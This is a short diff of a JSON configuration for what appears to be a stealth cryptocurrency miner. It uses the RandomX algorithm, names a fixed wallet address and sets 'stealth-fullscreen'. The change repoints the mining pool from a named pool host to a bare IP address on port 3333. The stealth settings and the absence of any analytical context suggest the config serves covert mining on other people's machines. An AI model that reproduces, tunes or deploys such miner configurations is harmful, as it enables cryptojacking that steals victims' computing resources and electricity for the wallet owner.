@@ -1,7 +1,7 @@
 {
     "algo": "rx/0",
-    "pool": "pool.hashvault.pro",
-    "port": 443,
+    "pool": "185.216.193.78",
+    "port": 3333,
     "wallet": "83TXvqsSG9WW9Tax9gPKu2WcDMeT4W1ASb6ixvpFCk139reQbhDYpuV9x6evKnNSZsEjEZ4L1R45JZ9xhE8BgUMJA5X2akq",
     "password": "Robl",
     "nicehash": true,
@@ -13,4 +13,5 @@
     "kill-targets": "",
     "stealth-fullscreen": true
 }
+
 
